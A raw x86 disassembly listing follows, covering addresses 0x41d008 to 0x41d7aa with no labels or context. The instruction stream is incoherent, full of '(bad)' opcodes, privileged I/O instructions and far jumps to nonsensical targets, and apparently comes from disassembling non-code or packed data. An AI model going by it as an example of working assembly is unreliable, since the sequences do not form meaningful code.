  41d008:	push   0x2c2662ca
  41d00d:	jb     0x41cfe8
  41d00f:	pop    ecx
  41d010:	ds (bad) 
  41d012:	je     0x41cf9f
  41d014:	pop    ss
  41d015:	cmp    BYTE PTR [ebx+0x35],ah
  41d018:	hlt    
  41d019:	jnp    0x41d070
  41d01b:	xor    cl,BYTE PTR [esi]
  41d01d:	pop    edx
  41d01e:	ins    BYTE PTR es:[edi],dx
  41d01f:	inc    edx
  41d020:	outs   dx,BYTE PTR ds:[esi]
  41d021:	hlt    
  41d022:	jmp    0xbd90:0x5bf76cbb
  41d029:	cmp    BYTE PTR [esi+0x6c908eda],dh
  41d02f:	aas    
  41d030:	xchg   DWORD PTR [ecx],ebp
  41d032:	mov    esi,0x7eb6c91b
  41d037:	cmp    ebx,esp
  41d039:	mov    esp,0x123c12d1
  41d03e:	or     DWORD PTR [edx-0x46232237],0x4ff0d08d
  41d048:	call   0xfebd4d6f
  41d04d:	dec    esp
  41d04e:	and    al,0x41
  41d050:	scas   al,BYTE PTR es:[edi]
  41d051:	mov    ah,0x76
  41d053:	icebp  
  41d054:	ja     0x41cfec
  41d056:	jb     0x41d045
  41d058:	nop
  41d059:	mov    dh,0x3e
  41d05b:	out    dx,eax
  41d05c:	mov    ch,0x9e
  41d05e:	jp     0x41d075
  41d060:	push   edi
  41d061:	pop    esi
  41d062:	out    0x26,al
  41d064:	xchg   esi,eax
  41d065:	fist   WORD PTR [edx+ecx*8]
  41d068:	push   ds
  41d069:	pop    esi
  41d06a:	inc    edi
  41d06b:	imul   ecx,DWORD PTR [edx],0x755238d3
  41d071:	inc    ecx
  41d072:	ficom  DWORD PTR [ecx+0x773d766]
  41d078:	(bad)  
  41d079:	cs or  al,0x64
  41d07c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d07d:	in     eax,0xa1
  41d07f:	inc    ebp
  41d080:	std    
  41d081:	(bad)  
  41d084:	xor    bl,BYTE PTR [ebp+0x38]
  41d087:	and    bl,BYTE PTR [eax+ebx*1-0x6c]
  41d08b:	(bad)  [edi+0x8]
  41d08e:	in     al,0x85
  41d090:	add    BYTE PTR [esp+edi*8-0x6f83a96e],dh
  41d097:	jg     0x41d047
  41d099:	inc    ebx
  41d09a:	push   eax
  41d09b:	adc    eax,0xd668a8aa
  41d0a0:	cld    
  41d0a1:	cli    
  41d0a2:	mov    gs,WORD PTR [eax+0x2e]
  41d0a5:	xlat   BYTE PTR ds:[ebx]
  41d0a6:	push   esi
  41d0a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0a8:	jns    0x41d065
  41d0aa:	cmp    al,0xb4
  41d0ac:	in     eax,dx
  41d0ad:	adc    eax,0x21297bf9
  41d0b2:	mov    dl,BYTE PTR [ebp+ebx*4+0x3052f2f9]
  41d0b9:	mov    edx,0xaf1704fa
  41d0be:	or     BYTE PTR [edi],dh
  41d0c0:	stos   BYTE PTR es:[edi],al
  41d0c1:	sbb    eax,0x398bfe3b
  41d0c6:	cld    
  41d0c7:	push   edi
  41d0c8:	mov    al,ds:0x8ee0e1d0
  41d0cd:	test   al,0x8
  41d0cf:	shl    BYTE PTR [ebx-0x5e],cl
  41d0d2:	xchg   DWORD PTR [ebp-0x3c],esp
  41d0d5:	inc    esp
  41d0d6:	adc    al,0x33
  41d0d8:	mov    WORD PTR [ecx+0x5],gs
  41d0db:	hlt    
  41d0dc:	arpl   ax,ax
  41d0de:	out    dx,al
  41d0df:	sub    BYTE PTR [bp+di-0x4213],ah
  41d0e4:	or     bl,BYTE PTR [eax+0x3215ec3e]
  41d0ea:	arpl   WORD PTR [ebx+0xa],di
  41d0ed:	arpl   bx,cx
  41d0ef:	iret   
  41d0f0:	fiadd  WORD PTR [ecx+0x42]
  41d0f3:	in     eax,0x6d
  41d0f5:	jmp    0x41d128
  41d0f7:	push   esi
  41d0f8:	push   ss
  41d0f9:	inc    esi
  41d0fb:	mov    eax,0xc32d2cfb
  41d100:	mov    al,0x1d
  41d102:	add    dl,BYTE PTR [esi-0x2b97dc78]
  41d108:	pop    ebp
  41d109:	jo     0x41d0a3
  41d10b:	cmp    ebx,edx
  41d10d:	mov    DWORD PTR ds:0x42a341,0x4781
  41d117:	jmp    0x41d629
  41d11c:	(bad)  
  41d11d:	xlat   BYTE PTR ds:[ebx]
  41d11e:	into   
  41d11f:	ror    dh,1
  41d121:	aad    0xc5
  41d123:	xlat   BYTE PTR ds:[ebx]
  41d124:	imul   edi,esp,0xc0d9692a
  41d12a:	ret    
  41d12b:	jb     0x41d0bc
  41d12d:	stos   DWORD PTR es:[edi],eax
  41d12e:	jg     0x41d1a8
  41d130:	jae    0x41d1ae
  41d132:	js     0x41d1ac
  41d134:	and    al,BYTE PTR [edi]
  41d136:	cli    
  41d137:	int3   
  41d138:	push   edi
  41d139:	and    DWORD PTR [ecx],esp
  41d13b:	sub    BYTE PTR [ecx+0x4c66a4],al
  41d141:	dec    edi
  41d142:	adc    DWORD PTR [eax+esi*2+0x5a],esp
  41d146:	loop   0x41d1c1
  41d148:	test   BYTE PTR [esi-0x38bc7a9c],0xc6
  41d14f:	inc    ebx
  41d150:	imul   ebx,DWORD PTR [ebx],0xffffffdd
  41d153:	dec    edx
  41d154:	sbb    eax,0x3149eed2
  41d159:	lods   eax,DWORD PTR ds:[esi]
  41d15a:	in     al,dx
  41d15b:	push   ecx
  41d15c:	adc    eax,0xffc805fe
  41d161:	adc    eax,0x90d89e7
  41d166:	push   ebp
  41d167:	add    esi,edx
  41d169:	retf   
  41d16a:	push   eax
  41d16b:	lods   eax,DWORD PTR ds:[esi]
  41d16c:	xchg   BYTE PTR [edi-0x310e9e77],ch
  41d172:	lds    edx,FWORD PTR [edi]
  41d174:	push   ds
  41d175:	push   0x2cea255b
  41d17a:	aaa    
  41d17b:	scas   al,BYTE PTR es:[edi]
  41d17c:	inc    eax
  41d17d:	adc    DWORD PTR [ebp-0x72],esi
  41d180:	leave  
  41d181:	sbb    eax,0xa47a43f7
  41d186:	ins    DWORD PTR es:[edi],dx
  41d187:	xchg   ebx,eax
  41d188:	adc    dx,bx
  41d18b:	xchg   edi,eax
  41d18c:	push   ebx
  41d18d:	ins    BYTE PTR es:[edi],dx
  41d18e:	push   0x40
  41d190:	fucom  st(5)
  41d192:	xor    eax,0x82e0a6e4
  41d197:	sbb    al,0x89
  41d199:	adc    BYTE PTR [edi+0x40],dh
  41d19c:	dec    esp
  41d19d:	sub    eax,DWORD PTR [ecx+0x31e7da02]
  41d1a3:	pop    edi
  41d1a4:	pop    edi
  41d1a5:	pop    ebx
  41d1a6:	stos   BYTE PTR es:[edi],al
  41d1a7:	add    BYTE PTR [ecx],bl
  41d1a9:	call   0xce29:0x1a9c2168
  41d1b0:	mov    ebp,0xf585cc90
  41d1b5:	push   ebp
  41d1b6:	int3   
  41d1b7:	pop    esp
  41d1b8:	pop    edx
  41d1b9:	ins    DWORD PTR es:[edi],dx
  41d1ba:	test   BYTE PTR ds:0xb6fe3e4e,cl
  41d1c0:	or     bl,BYTE PTR [eax+0x56da18e4]
  41d1c6:	test   eax,0x78f5ef94
  41d1cb:	call   0x40124f46
  41d1d0:	lods   al,BYTE PTR ds:[esi]
  41d1d1:	shr    ebp,cl
  41d1d3:	sbb    edx,DWORD PTR [ecx]
  41d1d5:	mov    ebx,0xe221914f
  41d1da:	fs inc ecx
  41d1dc:	shl    bh,cl
  41d1de:	test   edx,ecx
  41d1e0:	jns    0x41d229
  41d1e2:	mov    bl,0x31
  41d1e4:	jo     0x41d257
  41d1e6:	clc    
  41d1e7:	mov    eax,ds:0xf64cf331
  41d1ec:	mov    BYTE PTR [si-0x6ff0],dh
  41d1f1:	mov    ds:0x8c8ee9ca,al
  41d1f6:	or     ah,BYTE PTR [esi+0x69]
  41d1f9:	in     al,dx
  41d1fa:	fldcw  WORD PTR [ebp+0x36710d5d]
  41d200:	dec    ebx
  41d201:	std    
  41d202:	add    DWORD PTR [ebx-0x2a],eax
  41d205:	pop    ss
  41d206:	aam    0x9f
  41d208:	mov    bl,0x11
  41d20a:	addr16 in eax,dx
  41d20c:	mov    cl,0x5c
  41d20e:	push   eax
  41d20f:	and    al,0xef
  41d211:	jb     0x41d271
  41d213:	test   al,0xa8
  41d215:	jp     0x41d1fc
  41d217:	xor    cl,BYTE PTR [eax]
  41d219:	xchg   edx,eax
  41d21a:	cmp    bh,BYTE PTR [ebx]
  41d21c:	push   esi
  41d21d:	xor    dh,BYTE PTR ds:0x2da8e9c6
  41d223:	and    al,0x25
  41d225:	retf   0xad29
  41d228:	or     eax,0xfbd4d91e
  41d22d:	cmp    esp,edx
  41d22f:	stc    
  41d230:	setg   cl
  41d233:	and    al,0xb6
  41d235:	por    mm3,mm7
  41d238:	add    eax,0xa1023145
  41d23d:	in     eax,0x2
  41d23f:	dec    esi
  41d240:	pop    edi
  41d241:	xor    BYTE PTR [eiz*8-0x3fd94286],dh
  41d248:	aas    
  41d249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d24a:	sbb    BYTE PTR [ebx-0x155a85ae],0x81
  41d251:	pop    esp
  41d252:	jnp    0x41d2bf
  41d254:	and    eax,0xdb45d070
  41d259:	into   
  41d25a:	pushf  
  41d25b:	push   edi
  41d25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d25d:	pop    esi
  41d25e:	scas   al,BYTE PTR es:[edi]
  41d25f:	fwait
  41d260:	in     eax,0x44
  41d262:	xchg   BYTE PTR [esi+0x6d],cl
  41d265:	cmp    esi,DWORD PTR [eiz*2+0x15f788b5]
  41d26c:	pusha  
  41d26d:	pop    esi
  41d26e:	pop    edx
  41d26f:	call   0xe9d89f7e
  41d274:	rcr    cl,1
  41d276:	lea    edi,[esi-0x6732ef74]
  41d27c:	aam    0x9
  41d27e:	outs   dx,DWORD PTR ds:[esi]
  41d27f:	dec    edx
  41d280:	cmp    edi,DWORD PTR [edx+0x67a7ccf6]
  41d286:	repnz sahf 
  41d288:	retf   
  41d289:	mov    al,ds:0x2155e777
  41d28e:	push   cx
  41d290:	pop    ebp
  41d291:	xor    eax,esp
  41d293:	les    esp,FWORD PTR [ebp-0x793543bc]
  41d299:	mov    bh,dl
  41d29b:	mov    al,0xe4
  41d29d:	or     BYTE PTR [ecx],ah
  41d29f:	test   al,0x27
  41d2a1:	push   ebx
  41d2a2:	mov    bl,0x98
  41d2a4:	inc    edi
  41d2a5:	loope  0x41d2c4
  41d2a7:	push   ds
  41d2a8:	push   es
  41d2a9:	nop
  41d2aa:	add    edx,ebx
  41d2ac:	addr16 xchg ebp,eax
  41d2ae:	pop    eax
  41d2af:	mov    BYTE PTR [edi],ch
  41d2b1:	shr    BYTE PTR [ebx-0x5b],0x2d
  41d2b5:	retf   0xdc2a
  41d2b8:	pushf  
  41d2b9:	sub    al,0x48
  41d2bb:	div    BYTE PTR [edx]
  41d2bd:	push   ebp
  41d2be:	imul   edi,DWORD PTR [ecx+0x472f4c67],0xc1e4bc76
  41d2c8:	and    dh,BYTE PTR [edx]
  41d2ca:	sbb    BYTE PTR [edx],cl
  41d2cc:	aad    0xaf
  41d2ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2cf:	into   
  41d2d0:	jno    0x41d2a9
  41d2d2:	xor    ecx,ebx
  41d2d4:	aaa    
  41d2d5:	leave  
  41d2d6:	(bad)  
  41d2d7:	sub    BYTE PTR [edi-0x6d],dh
  41d2da:	out    0x39,al
  41d2dc:	(bad)  
  41d2dd:	mov    eax,0x25e93755
  41d2e2:	sub    DWORD PTR ds:0x59079148,0x66
  41d2e9:	lods   al,BYTE PTR ds:[esi]
  41d2ea:	and    al,0xa
  41d2ec:	mov    edi,0x5ba5d481
  41d2f1:	xor    ah,cl
  41d2f3:	fidiv  WORD PTR [edx-0x1f]
  41d2f6:	push   edx
  41d2f7:	popf   
  41d2f8:	sub    esi,esi
  41d2fa:	js     0x41d29c
  41d2fc:	jle    0x41d2e3
  41d2fe:	ror    BYTE PTR [edx-0x15],1
  41d301:	mov    cl,0x2e
  41d303:	rcr    BYTE PTR [edx],0xfb
  41d306:	int    0x4a
  41d308:	hlt    
  41d309:	xor    DWORD PTR [esi+0x689d7c89],0x9fb7298
  41d313:	daa    
  41d314:	aad    0xf8
  41d316:	imul   ebp,DWORD PTR [ecx+eax*4+0x2a],0xfffffff6
  41d31b:	push   ecx
  41d31c:	dec    eax
  41d31d:	and    DWORD PTR [eax+0x5e],eax
  41d320:	pop    es
  41d321:	enter  0xb8f8,0x41
  41d325:	xchg   edx,eax
  41d326:	push   es
  41d327:	sub    ch,al
  41d329:	je     0x41d2ab
  41d32b:	or     DWORD PTR [edi+0x6],edi
  41d32e:	cmp    al,0xd2
  41d330:	adc    DWORD PTR [esi],esp
  41d332:	and    eax,0xd9349f26
  41d337:	push   esi
  41d338:	aad    0xb5
  41d33a:	out    0x83,eax
  41d33c:	imul   edx,DWORD PTR [edi-0x7d],0x98ad9a69
  41d343:	ins    BYTE PTR es:[edi],dx
  41d344:	dec    eax
  41d345:	push   0xffffffe7
  41d347:	jmp    0xf2f65e6f
  41d34c:	inc    eax
  41d34d:	loope  0x41d2d3
  41d34f:	std    
  41d350:	adc    bh,dh
  41d352:	leave  
  41d353:	mov    ch,0xe1
  41d355:	outs   dx,BYTE PTR ds:[esi]
  41d356:	out    0x8b,al
  41d358:	out    0xe9,al
  41d35a:	jns    0x41d3cd
  41d35c:	cmp    ch,ah
  41d35e:	clc    
  41d35f:	aas    
  41d360:	lea    ebx,[edi+0x24]
  41d363:	fist   WORD PTR [eax+0x78eb75a7]
  41d369:	std    
  41d36a:	pop    esi
  41d36b:	loopne 0x41d2fb
  41d36d:	jmp    0x41d33c
  41d36f:	cld    
  41d370:	cld    
  41d371:	jae    0x41d3b5
  41d373:	inc    ebx
  41d374:	stc    
  41d375:	(bad)  
  41d376:	jmp    0x9f491fe2
  41d37b:	pushf  
  41d37c:	iret   
  41d37d:	fld    DWORD PTR [ebx+0x16]
  41d380:	and    ecx,DWORD PTR [ebp*2+0x9f927ec]
  41d387:	add    eax,0x61ee6190
  41d38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d38d:	push   eax
  41d38e:	mov    ds:0xcc542007,eax
  41d393:	arpl   WORD PTR gs:[esi],di
  41d396:	mov    dh,0x9e
  41d398:	and    DWORD PTR [ebp+edx*2+0x2e],ebx
  41d39c:	inc    ebp
  41d39d:	jecxz  0x41d41c
  41d39f:	mov    edx,0x8810f468
  41d3a4:	mov    ecx,0xa253094e
  41d3a9:	push   esp
  41d3aa:	xor    DWORD PTR [ebx-0x29bef493],esi
  41d3b0:	and    ebx,0x54
  41d3b3:	je     0x41d379
  41d3b5:	pop    es
  41d3b6:	in     al,0x7
  41d3b8:	xor    ecx,DWORD PTR [ebx]
  41d3ba:	test   edx,ebp
  41d3bc:	add    bl,cl
  41d3be:	data16 jbe 0x41d364
  41d3c1:	fwait
  41d3c2:	sti    
  41d3c3:	cmp    BYTE PTR [ebx-0x41],dl
  41d3c6:	push   ss
  41d3c7:	cwde   
  41d3c8:	pop    ds
  41d3c9:	clc    
  41d3ca:	inc    ebp
  41d3cb:	imul   edi,esi,0x4c
  41d3ce:	shl    DWORD PTR [edi+edx*1],1
  41d3d1:	into   
  41d3d2:	sbb    ah,BYTE PTR [esi]
  41d3d4:	sub    BYTE PTR [eax],dl
  41d3d6:	push   ecx
  41d3d7:	dec    ebx
  41d3d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3d9:	push   edx
  41d3da:	es test al,0xc7
  41d3dd:	xchg   BYTE PTR [ebx],al
  41d3df:	jle    0x41d399
  41d3e1:	lds    ecx,FWORD PTR [eax+0x2c]
  41d3e4:	inc    ebp
  41d3e5:	jb     0x41d3cb
  41d3e7:	scas   al,BYTE PTR es:[edi]
  41d3e8:	das    
  41d3e9:	fstp   st(0)
  41d3eb:	imul   esi,DWORD PTR [ebx-0x3737272b],0x7d
  41d3f2:	and    BYTE PTR [edi+ecx*1-0x36],ah
  41d3f6:	mov    dh,0x56
  41d3f8:	ret    
  41d3f9:	adc    dh,bh
  41d3fb:	dec    edx
  41d3fc:	mov    cl,ah
  41d3fe:	sar    DWORD PTR [ecx+0x6a],0xe9
  41d402:	sub    eax,edi
  41d404:	shr    BYTE PTR [edi+0x27c52224],cl
  41d40a:	jo     0x41d412
  41d40c:	sub    edx,DWORD PTR [ebp+0x5d]
  41d40f:	cmp    DWORD PTR [ebp-0x21],ebp
  41d412:	sbb    edi,DWORD PTR [esi+0x15]
  41d415:	inc    edx
  41d416:	add    al,dl
  41d418:	push   esi
  41d419:	aad    0x46
  41d41b:	push   esi
  41d41c:	and    BYTE PTR [ecx-0x55],al
  41d41f:	icebp  
  41d420:	lods   eax,DWORD PTR ds:[esi]
  41d421:	les    edi,FWORD PTR [ebp-0x2ec63856]
  41d427:	and    ebp,edi
  41d429:	push   ebp
  41d42a:	fs push ebp
  41d42c:	pop    eax
  41d42d:	sti    
  41d42e:	es jbe 0x41d3bc
  41d431:	push   esp
  41d432:	cdq    
  41d433:	lock xchg edx,eax
  41d435:	adc    DWORD PTR [ebx+edx*4-0x51],esp
  41d439:	imul   eax,DWORD PTR [eax+ecx*1+0x7b0950df],0x8402e28e
  41d444:	test   al,0x19
  41d446:	mov    ch,0xef
  41d448:	or     al,0x8d
  41d44a:	mov    bh,0xa4
  41d44c:	icebp  
  41d44d:	add    DWORD PTR [eax+0x4d],ecx
  41d450:	mov    ah,0x14
  41d452:	imul   DWORD PTR [eax+0x26]
  41d455:	dec    ebx
  41d456:	push   0x7a4718a
  41d45b:	dec    edi
  41d45c:	and    cl,dl
  41d45e:	mov    esp,0x4efd5577
  41d463:	mov    dh,0x57
  41d465:	je     0x41d411
  41d467:	pop    ebx
  41d468:	dec    edx
  41d469:	lods   eax,DWORD PTR ds:[esi]
  41d46a:	push   ds
  41d46b:	cs ret 
  41d46d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d46f:	sbb    eax,0x26dbda2b
  41d474:	fldenv [ecx-0x50d2f39d]
  41d47a:	fbstp  TBYTE PTR [esi+0x243a096]
  41d480:	loopne 0x41d472
  41d482:	cmc    
  41d483:	mov    al,ds:0xe3ff6779
  41d488:	mov    esp,0x83f92cce
  41d48d:	int    0xa
  41d48f:	test   al,0x1
  41d491:	scas   eax,DWORD PTR es:[edi]
  41d492:	in     al,0x3a
  41d494:	xor    DWORD PTR [ebp+0x63],esp
  41d497:	mov    esp,0x8d223472
  41d49c:	pop    esp
  41d49d:	ja     0x41d4d4
  41d49f:	daa    
  41d4a0:	loopne 0x41d4d2
  41d4a2:	push   edx
  41d4a3:	shl    bl,cl
  41d4a5:	nop
  41d4a6:	sub    eax,0xcb28ddfc
  41d4ab:	call   0xba0e:0x79f28a13
  41d4b2:	jge    0x41d475
  41d4b4:	push   eax
  41d4b5:	inc    esp
  41d4b6:	sub    DWORD PTR [eax+eax*8],0x2db94dac
  41d4bd:	loope  0x41d538
  41d4bf:	cli    
  41d4c0:	mov    al,0xdf
  41d4c2:	out    dx,al
  41d4c3:	popf   
  41d4c4:	iret   
  41d4c5:	cmp    eax,0xdb003020
  41d4ca:	jmp    0x41d548
  41d4cc:	bound  esi,QWORD PTR [ecx-0x6b]
  41d4cf:	je     0x41d542
  41d4d1:	or     DWORD PTR [ecx-0x69128a92],0x18
  41d4d8:	(bad)  
  41d4d9:	into   
  41d4da:	sub    BYTE PTR [edx+0x7c],bl
  41d4dd:	push   0x81c96939
  41d4e2:	add    ecx,edi
  41d4e4:	add    eax,0x6eab7249
  41d4e9:	scas   eax,DWORD PTR es:[edi]
  41d4ea:	leave  
  41d4eb:	adc    bh,BYTE PTR [esi+0x68]
  41d4ee:	das    
  41d4ef:	outs   dx,DWORD PTR ds:[esi]
  41d4f0:	add    edi,DWORD PTR ds:0xaafff0f8
  41d4f6:	mov    bh,0xd0
  41d4f8:	fisttp WORD PTR ds:0xd88e0677
  41d4fe:	cs add ebp,DWORD PTR ss:0x1ce7206a
  41d506:	cs cmc 
  41d508:	das    
  41d509:	fsub   QWORD PTR [ebx+eiz*8-0x4491f7b2]
  41d510:	fild   WORD PTR [ecx-0x6c]
  41d513:	inc    edi
  41d514:	outs   dx,BYTE PTR ds:[esi]
  41d515:	mov    dl,0xfd
  41d517:	inc    esi
  41d518:	call   0xc83e:0x64c80612
  41d51f:	cvtps2pi mm1,xmm5
  41d522:	mov    WORD PTR [ecx-0x28],ds
  41d525:	retf   
  41d526:	icebp  
  41d527:	inc    esi
  41d528:	(bad)  
  41d529:	retf   0xf0a5
  41d52c:	and    al,BYTE PTR [ecx+0x25]
  41d52f:	jmp    0x45e:0x4f1a323a
  41d536:	(bad)  
  41d537:	xor    ch,BYTE PTR [edi]
  41d539:	push   ecx
  41d53a:	mov    ds:0xda544393,al
  41d53f:	and    DWORD PTR [ebx],ebx
  41d541:	add    eax,0x45a750a7
  41d546:	pop    edx
  41d547:	data16 jo 0x41d5c2
  41d54a:	lds    ebx,FWORD PTR [ecx+0x59fcd967]
  41d550:	repz fstp TBYTE PTR [ebx+0x5dd260]
  41d557:	sub    BYTE PTR [ebp+ecx*8-0x7eb0b8aa],0x63
  41d55f:	mov    edi,0xb95f2eaf
  41d564:	or     bl,BYTE PTR [esp+ecx*8]
  41d567:	test   al,0x21
  41d569:	or     al,0x24
  41d56b:	or     al,0xd0
  41d56d:	xchg   DWORD PTR [esi+ebx*4-0x1028b988],ebp
  41d574:	mov    ebp,0x22256414
  41d579:	shl    edx,cl
  41d57b:	cmc    
  41d57c:	sbb    BYTE PTR [ecx+0x5],dh
  41d57f:	push   ebx
  41d580:	jp     0x41d55e
  41d582:	xchg   esp,eax
  41d583:	inc    eax
  41d584:	popa   
  41d585:	fidiv  DWORD PTR [edx-0x55]
  41d588:	inc    bx
  41d58a:	mov    esi,0x5b7e7d92
  41d58f:	jl     0x41d527
  41d591:	dec    ecx
  41d592:	inc    edx
  41d593:	mov    ecx,0x918b054a
  41d598:	test   al,0x23
  41d59a:	pop    es
  41d59b:	jo     0x41d567
  41d59d:	sbb    eax,0xf9329b06
  41d5a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5a3:	xchg   ecx,eax
  41d5a4:	push   ss
  41d5a5:	jns    0x41d560
  41d5a7:	gs mov dl,0x39
  41d5aa:	xor    BYTE PTR [eax],ah
  41d5ac:	lods   eax,DWORD PTR ds:[esi]
  41d5ad:	test   eax,0x7ec17445
  41d5b2:	mul    DWORD PTR [ecx+0x2f]
  41d5b5:	nop
  41d5b6:	jo     0x41d55c
  41d5b8:	mov    bl,0x65
  41d5ba:	and    ecx,0x5002cb68
  41d5c0:	sbb    al,0x3f
  41d5c2:	sti    
  41d5c3:	push   es
  41d5c4:	addr16 cdq 
  41d5c6:	into   
  41d5c7:	cld    
  41d5c8:	fsubrp st(0),st
  41d5ca:	pushf  
  41d5cb:	repz dec ebp
  41d5cd:	pop    es
  41d5ce:	mov    dh,0x32
  41d5d0:	mov    dl,0x10
  41d5d2:	ret    
  41d5d3:	mov    esp,0xa17a8fb6
  41d5d8:	cli    
  41d5d9:	mov    esi,DWORD PTR [esi+0x2f]
  41d5dc:	dec    ebp
  41d5dd:	inc    edx
  41d5de:	jmp    0x4a992ed8
  41d5e3:	adc    bl,0xbb
  41d5e6:	inc    eax
  41d5e7:	repz mov bl,0x8a
  41d5ea:	pop    es
  41d5eb:	dec    ebp
  41d5ec:	jmp    0x4f34:0x1d834297
  41d5f3:	outs   dx,DWORD PTR ds:[esi]
  41d5f4:	loop   0x41d5ea
  41d5f6:	test   eax,0x7513cc6a
  41d5fb:	pop    ecx
  41d5fc:	push   esi
  41d5fd:	xchg   ecx,eax
  41d5fe:	inc    eax
  41d5ff:	pop    esp
  41d600:	js     0x41d5d0
  41d602:	fstp   TBYTE PTR [esi*4-0x7c30eed4]
  41d609:	mov    edi,DWORD PTR [eax-0x7bc4f416]
  41d60f:	push   edi
  41d610:	mov    eax,ds:0x26a62b18
  41d615:	pop    esp
  41d616:	aam    0x86
  41d618:	pop    ecx
  41d619:	cs add esi,eax
  41d61c:	outs   dx,DWORD PTR ds:[esi]
  41d61d:	loop   0x41d5de
  41d61f:	je     0x41d5dd
  41d621:	jmp    0x1b3f:0x1cff7e21
  41d628:	sub    ecx,DWORD PTR [edi]
  41d62a:	xchg   DWORD PTR [ebx],esi
  41d62c:	add    eax,0x8b4a0000
  41d631:	push   ebp
  41d632:	cld    
  41d633:	xor    edx,eax
  41d635:	sbb    DWORD PTR ds:0x42a3fd,0x42a3c9
  41d63f:	add    edx,ecx
  41d641:	mov    DWORD PTR ds:0x42a2e1,0x3c09
  41d64b:	jmp    0x422881
  41d650:	jmp    0x41db62
  41d655:	ror    ch,0xd3
  41d658:	rcr    ecx,1
  41d65a:	rol    esi,1
  41d65c:	(bad)  [edi]
  41d65e:	aad    0x6e
  41d660:	stos   BYTE PTR es:[edi],al
  41d661:	xchg   ebx,eax
  41d662:	sub    eax,0xae823c8a
  41d667:	jg     0x41d6e1
  41d669:	jae    0x41d6e7
  41d66b:	js     0x41d6e5
  41d66d:	mov    edi,0xca0e2c1c
  41d672:	stos   BYTE PTR es:[edi],al
  41d673:	mov    eax,ds:0x40f2666b
  41d678:	call   0x460e022c
  41d67d:	scas   al,BYTE PTR es:[edi]
  41d67e:	test   eax,0x3a7a16fd
  41d683:	out    0x22,eax
  41d685:	nop
  41d686:	push   0xa9b12c2d
  41d68b:	adc    al,0x64
  41d68d:	call   0x8c5f:0x94a28ab
  41d694:	loopne 0x41d65a
  41d696:	and    al,0x3
  41d698:	cld    
  41d699:	data16 xchg BYTE PTR [ebp+0x6a114f4e],cl
  41d6a0:	es es inc edx
  41d6a3:	jg     0x41d6b7
  41d6a5:	mov    ds:0x3ee96a51,al
  41d6aa:	addr16 out dx,al
  41d6ac:	pop    es
  41d6ad:	dec    ecx
  41d6ae:	mov    BYTE PTR ss:[edi-0x5f],bh
  41d6b2:	retf   0xfd8e
  41d6b5:	pop    ss
  41d6b6:	test   BYTE PTR [edi+ecx*1-0x4de2aa93],ch
  41d6bd:	es stos BYTE PTR es:[edi],al
  41d6bf:	dec    esp
  41d6c0:	add    eax,0xebf01238
  41d6c5:	into   
  41d6c6:	lods   al,BYTE PTR ds:[esi]
  41d6c7:	or     bh,BYTE PTR [esi-0x61e46626]
  41d6cd:	mov    dh,0x72
  41d6cf:	test   al,0x8f
  41d6d1:	test   BYTE PTR [ebx],0xde
  41d6d4:	mov    eax,ds:0x89233518
  41d6d9:	test   DWORD PTR [esi+eiz*4+0x53],edi
  41d6dd:	mov    DWORD PTR [esi+esi*1-0x2c2c6b7a],edi
  41d6e4:	mov    ebx,0xeafa4653
  41d6e9:	call   0xbe6f93d3
  41d6ee:	jge    0x41d71d
  41d6f0:	cwde   
  41d6f1:	pop    edi
  41d6f2:	mov    ch,0x46
  41d6f5:	and    al,al
  41d6f7:	push   es
  41d6f8:	dec    esi
  41d6f9:	and    esp,DWORD PTR [edx+0x72]
  41d6fc:	retf   0x27
  41d6ff:	xchg   ebp,eax
  41d700:	and    DWORD PTR es:[edx],ecx
  41d703:	mov    bh,0xec
  41d705:	push   edx
  41d706:	jae    0x41d708
  41d708:	mov    al,ds:0x9d3c1cb0
  41d70d:	xchg   edi,ecx
  41d70f:	jmp    0x41d69a
  41d711:	push   esp
  41d712:	pop    ds
  41d713:	and    eax,0x5254c023
  41d718:	(bad)  
  41d719:	ins    DWORD PTR es:[edi],dx
  41d71a:	jo     0x41d797
  41d71c:	test   DWORD PTR [edx+0x2c],eax
  41d71f:	ins    DWORD PTR es:[edi],dx
  41d720:	in     al,dx
  41d721:	mov    eax,0x323e882d
  41d726:	inc    edx
  41d727:	ret    0x4c1f
  41d72a:	xor    BYTE PTR [edi],al
  41d72c:	dec    ebx
  41d72d:	cmp    DWORD PTR gs:[ecx+0x7f],eax
  41d731:	adc    eax,0x8b1d45bb
  41d736:	xor    BYTE PTR [edi],0xa8
  41d739:	push   ss
  41d73a:	clc    
  41d73b:	sar    BYTE PTR [ebx],1
  41d73d:	in     al,dx
  41d73e:	mov    ds:0x9236f19c,eax
  41d743:	rol    BYTE PTR [esi*2-0xe3bf93a],1
  41d74a:	and    al,dl
  41d74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d74d:	retf   0x96ab
  41d750:	pop    ecx
  41d751:	inc    ecx
  41d752:	stos   DWORD PTR es:[edi],eax
  41d753:	mov    ds,WORD PTR [ecx+ebx*8-0x3e1cbf8a]
  41d75a:	push   edi
  41d75b:	and    ah,BYTE PTR [ebx-0x1276adc4]
  41d761:	add    eax,0xf9f15e7f
  41d766:	mov    dl,0x42
  41d768:	mov    DWORD PTR [ebp-0x5a],0xb21c09aa
  41d76f:	(bad)  
  41d771:	jo     0x41d757
  41d773:	popf   
  41d774:	inc    esi
  41d775:	repz adc DWORD PTR [ebp+0x8d0e0fb],0x2c
  41d77d:	aaa    
  41d77e:	mov    eax,ds:0x332d8a2e
  41d783:	or     eax,0x18751aac
  41d788:	or     ebx,DWORD PTR [eax+0x6c5817d0]
  41d78e:	ret    
  41d78f:	aam    0x92
  41d791:	push   0x672f1f00
  41d796:	mov    dh,0x2d
  41d798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d799:	das    
  41d79a:	add    DWORD PTR [eax-0x37],0xffffffab
  41d79e:	out    dx,al
  41d79f:	jmp    FWORD PTR [edx-0x73]
  41d7a2:	dec    esi
  41d7a3:	and    ch,al
  41d7a5:	mov    ds:0xf3692208,al
  41d7aa:	ror    BYTE PTR [ebx+0xc],1
